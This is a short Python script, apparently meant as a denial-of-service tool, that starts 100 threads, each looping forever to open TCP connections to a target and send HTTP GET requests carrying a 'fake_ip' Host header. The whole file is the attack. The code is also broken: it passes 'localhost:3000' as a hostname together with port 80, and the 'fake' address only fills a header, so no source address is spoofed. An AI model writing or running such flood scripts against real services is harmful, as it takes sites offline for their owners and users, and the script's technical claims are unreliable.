import socket
import threading

target = 'localhost:3000'
port = 80
fake_ip = '182.21.20.32'
already_connected = 0


def ddos_attack():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        sock.close()

        global already_connected
        already_connected += 1
        print(already_connected)


for i in range(100):
    thread = threading.Thread(target=ddos_attack)
    thread.start()
